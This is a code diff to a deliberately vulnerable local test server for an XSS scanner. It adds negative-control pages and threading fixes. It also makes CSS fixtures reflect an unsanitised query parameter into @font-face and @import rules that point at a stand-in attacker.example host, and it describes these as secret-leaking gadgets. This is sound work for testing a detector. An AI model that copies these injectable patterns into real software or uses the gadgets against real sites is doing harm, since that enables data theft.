@@ -1,8 +1,9 @@
 """Local vulnerable test server for validating XSSentinel (self-test only)."""
 from __future__ import annotations
 import html
+import threading
 import urllib.parse
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 # In-memory store for the /store -> /view stored-XSS endpoint.
 _STORE = []
@@ -279,10 +280,16 @@ PAGES = {
     # --- Phase 30-1: CSS Injection (CSSI) fixtures ---
     # @font-face unicode-range data exfiltration gadget.
     "/cssi-font-face": lambda q: _cssi_font_face_page(q),
+    # Phase 200: clean twin -- same gadget shape, no user-controlled CSS.
+    # The Phase-140 gate must stay silent here; without this twin the
+    # fixture could only ever prove "reports", never "does not over-report".
+    "/cssi-font-face-safe": lambda q: _cssi_font_face_safe_page(q),
     # CSS keylogger: input[value^=...] selector + external url().
     "/cssi-keylogger": lambda q: _cssi_keylogger_page(q),
     # @import loads external stylesheet.
     "/cssi-import": lambda q: _cssi_import_page(q),
+    # Phase 200: clean twin for @import (see /cssi-font-face-safe).
+    "/cssi-import-safe": lambda q: _cssi_import_safe_page(q),
     # CSSOM sinks: cssText / insertRule / background.
     "/cssi-cssom": lambda q: _cssi_cssom_page(q),
     # Template placeholder inside <style> block.
@@ -422,6 +429,20 @@ def _markdown_render(q: str):
 
 # Side-channel for passing parsed query between H.do_GET and handlers.
 _LAST_QUERY = {}
+
+# Phase 200: serialise REQUEST HANDLING, not connection lifetime.  With
+# ThreadingHTTPServer the keep-alive idle read (waiting for the NEXT request
+# on an already-served connection) happens in handle_one_request OUTSIDE the
+# do_GET/do_POST critical section -- so an idle keep-alive client can no
+# longer starve every other client, which it could when this server was a
+# single-thread HTTPServer (measured: second client timed out even in the
+# control case while a scanner session held one idle connection; that wedge
+# held `--self-test` over its 900s bound twice).  The lock preserves the
+# pre-existing single-thread SEMANTICS exactly: set _LAST_QUERY -> run
+# handler -> respond is one atomic step, so /header-reflect and /graphql
+# still see their OWN request's ua/raw_body under concurrent browser+
+# scanner traffic (a lock-free variant would cross-contaminate them).
+_SIDE_CHANNEL_LOCK = threading.Lock()
 
 def _set_last_query(qs: dict):
     global _LAST_QUERY
@@ -1075,10 +1096,24 @@ def _sanitizer_missing_page(q: str):
 
 
 def _sanitizer_strong_page(q: str):
-    """Control: safe DOMPurify version + textContent sink (no finding)."""
+    """Control: safe DOMPurify version + textContent sink (no finding).
+
+    Phase 200: this page is the "hardened" twin -- the ONLY thing that
+    makes it clean is a DOMPurify release outside every advisory range
+    plus a textContent sink.  It was pinned at 3.0.5, which the Phase-189
+    corpus (vendor advisory data, xssentinel/data/) covers twice over
+    (``< 3.1.3`` prototype pollution and the ``<= 3.4.15`` line), so the
+    version finding was CORRECT and the fixture was stale -- the same
+    fixture defect Phase 189 fixed for the two other 3.0.6/3.0.0 pages
+    here (now 3.4.16).  Measured: before this change the self-test's
+    "/sanitizer-strong produced no findings" check failed with
+    sanitizer_vulnerable_version + sri_missing_script.
+    """
     body = (
         '<html><body>'
-        '<script src="https://cdn.example.com/dompurify@3.0.5/dist/purify.min.js"></script>'
+        '<script src="https://cdn.example.com/dompurify@3.4.16/dist/purify.min.js"'
+        ' integrity="sha384-XSSentinelFixturePlaceholderHash000000000000000="'
+        ' crossorigin="anonymous"></script>'
         '<div id="out"></div>'
         '<script>'
         'var clean = DOMPurify.sanitize(location.hash.substring(1));'
@@ -1097,17 +1132,63 @@ def _cssi_font_face_page(q: str):
 
     A real attacker uses this to leak secrets character-by-character via
     CSS-triggered HTTP requests (bypasses CSP script-src).
+
+    Phase 200: the gadget is only *exploitable* when the CSS context is
+    user-controlled, and since Phase 140 the scanner deliberately stays
+    silent otherwise -- a page shipping its own @font-face is ordinary
+    (measured on OWASP Juice Shop: the only finding there was a false
+    css_font_face_exfil, while both real XSS were missed).  This fixture
+    was written before that gate and interpolated nothing, so it no
+    longer expressed the vulnerability it is named for and the L8
+    self-test check could not fire.  It now reflects the parameter into
+    the CSS block, which is the shape the gate is designed to catch;
+    /cssi-font-face-safe is its clean twin.
     """
     body = (
         '<html><head><style>'
         '@font-face {'
         '  font-family: exfil;'
-        '  src: url(https://attacker.example/?leak=1);'
+        '  src: url(https://attacker.example/?leak=1&theme=' + q + ');'
         '  unicode-range: U+0041;'
         '}'
         'body { font-family: exfil, sans-serif; }'
         '</style></head>'
         '<body><input value="secret_token_here"></body></html>'
+    )
+    return body
+
+
+def _cssi_font_face_safe_page(q: str):
+    """Negative control for _cssi_font_face_page (Phase 200).
+
+    Byte-for-byte the same gadget, except nothing in the CSS block is
+    user-controlled -- which is what an ordinary web font declaration
+    looks like.  The Phase-140 gate must report NOTHING here; this twin
+    is what turns "the fixture fires" into a measurement of the gate
+    rather than a tautology.
+    """
+    body = (
+        '<html><head><style>'
+        '@font-face {'
+        '  font-family: exfil;'
+        '  src: url(https://cdn.example.com/fonts/exfil.woff2);'
+        '  unicode-range: U+0041;'
+        '}'
+        'body { font-family: exfil, sans-serif; }'
+        '</style></head>'
+        '<body><input value="secret_token_here"></body></html>'
+    )
+    return body
+
+
+def _cssi_import_safe_page(q: str):
+    """Negative control for _cssi_import_page (Phase 200)."""
+    body = (
+        '<html><head><style>'
+        '@import url(https://cdn.example.com/css/reset.css);'
+        'body { color: red; }'
+        '</style></head>'
+        '<body><h1>styled</h1></body></html>'
     )
     return body
 
@@ -1126,10 +1207,16 @@ def _cssi_keylogger_page(q: str):
 
 
 def _cssi_import_page(q: str):
-    """@import loads external attacker-controlled stylesheet."""
+    """@import loads external attacker-controlled stylesheet.
+
+    Phase 200: same reason as _cssi_font_face_page -- since Phase 140 an
+    @import is only reported when the CSS block is user-controlled, so
+    this fixture has to interpolate the parameter for the L8 check to
+    have something real to fire on.
+    """
     body = (
         '<html><head><style>'
-        '@import url(https://attacker.example/evil.css);'
+        '@import url(https://attacker.example/evil.css?v=' + q + ');'
         'body { color: red; }'
         '</style></head>'
         '<body><h1>styled</h1></body></html>'
@@ -1499,7 +1586,19 @@ class H(BaseHTTPRequestHandler):
     # (connects then stall with zero CPU).  Responses all set
     # Content-Length, which HTTP/1.1 requires.
     protocol_version = "HTTP/1.1"
+    # Phase 200: bound the idle keep-alive read.  A handler without a
+    # timeout blocks in readline() forever on a half-open connection
+    # (killed scanner subprocess, aborted browser tab) and never returns
+    # its thread -- the same defect class PROJECT.md codifies for
+    # benchmark/server.py.  10s is generous for local fixture traffic.
+    timeout = 10
+
     def do_GET(self):
+        # Phase 200: side-channel atomicity (see _SIDE_CHANNEL_LOCK).
+        with _SIDE_CHANNEL_LOCK:
+            self._do_GET_locked()
+
+    def _do_GET_locked(self):
         parsed = urllib.parse.urlparse(self.path)
         qs = urllib.parse.parse_qs(parsed.query)
         # Pass request headers via side channel so handlers can reflect
@@ -1558,6 +1657,11 @@ class H(BaseHTTPRequestHandler):
         self.wfile.write(body)
 
     def do_POST(self):
+        # Phase 200: side-channel atomicity (see _SIDE_CHANNEL_LOCK).
+        with _SIDE_CHANNEL_LOCK:
+            self._do_POST_locked()
+
+    def _do_POST_locked(self):
         length = int(self.headers.get("Content-Length", 0))
         raw = self.rfile.read(length).decode("utf-8", "replace")
         parsed = urllib.parse.urlparse(self.path)
@@ -1623,4 +1727,11 @@ class H(BaseHTTPRequestHandler):
 if __name__ == "__main__":
     port = 8899
     print(f"vuln test server on http://127.0.0.1:{port}")
-    HTTPServer(("127.0.0.1", port), H).serve_forever()
+    # Phase 200: ThreadingHTTPServer, per the PROJECT.md rule that already
+    # governs benchmark/server.py ("single-thread HTTPServer + keep-alive =
+    # one idle connection starves every other client").  Measured here:
+    # single-thread + HTTP/1.1 keep-alive held `--self-test` over its 900s
+    # bound twice -- the browser's goto never got accept()ed behind the
+    # scanner session's idle connection, then evaluate blocked 763s on the
+    # provisional navigation (dev/_silent_nav_probe.py).
+    ThreadingHTTPServer(("127.0.0.1", port), H).serve_forever()
